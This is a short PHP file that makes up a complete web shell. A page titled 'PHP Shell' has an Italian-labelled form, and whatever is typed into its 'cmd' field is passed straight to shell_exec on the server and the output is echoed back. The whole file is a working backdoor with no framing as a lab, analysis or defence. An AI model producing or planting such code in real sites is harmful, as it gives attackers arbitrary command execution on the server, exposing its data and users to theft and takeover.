<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
</head>
<body>
    <form method="get">
        <label for="cmd">Comando:</label>
        <input type="text" id="cmd" name="cmd">
        <input type="submit" value="Esegui">
    </form>
</body>
</html>
